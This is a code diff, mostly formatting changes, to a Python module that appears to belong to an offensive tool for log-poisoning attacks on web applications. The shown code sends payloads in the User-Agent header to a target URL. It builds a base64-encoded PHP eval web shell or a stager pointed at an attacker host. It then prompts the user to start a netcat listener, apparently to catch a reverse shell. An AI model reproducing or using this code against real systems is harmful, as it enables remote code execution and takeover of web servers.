@@ -11,7 +11,6 @@ HERE = abspath(dirname(__file__))
 
 class Logs:
     def __init__(self, args):
-
         self.target = args.url
         self.location = args.location
         self.nostager = args.nostager
@@ -20,10 +19,12 @@ class Logs:
         self.detection = args.detection
 
     def attack(self, payload):
-        headers = {'User-Agent': payload}
+        headers = {"User-Agent": payload}
         if self.cookies:
             f_cookies = cook(self.cookies)
-            response = attack(self.target, self.location, headers=headers, cookies=f_cookies)
+            response = attack(
+                self.target, self.location, headers=headers, cookies=f_cookies
+            )
         else:
             response = attack(self.target, self.location, headers=headers)
         return response
@@ -42,23 +43,30 @@ class Logs:
 
         if self.nostager:
             with open("/tmp/{0}.php".format(shell), "r") as f:
-                data = f.read().encode('base64').replace("\n", " ")
+                data = f.read().encode("base64").replace("\n", " ")
                 payload = "<?php eval(base64_decode('{0}')); ?>".format(data)
         else:
             payload = STAGER.format(lhost, shell)
 
             try:
-                p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
+                p = subprocess.Popen(
+                    ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
+                )
                 p.communicate()
             except OSError as e:
-                print(colors("[!] Process Error",91))
+                print(colors("[!] Process Error", 91))
                 print(e)
 
-        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))
+        input(
+            colors(
+                "[?] Press Enter To Continue When Your netcat listener is Running ...",
+                94,
+            )
+        )
 
-        headers = {'User-Agent': payload}
+        headers = {"User-Agent": payload}
         if self.cookies:
-            f_cookies  = cook(self.cookies)
+            f_cookies = cook(self.cookies)
             attack(self.target, self.location, headers=headers, cookies=f_cookies)
         else:
             attack(self.target, self.location, headers=headers)
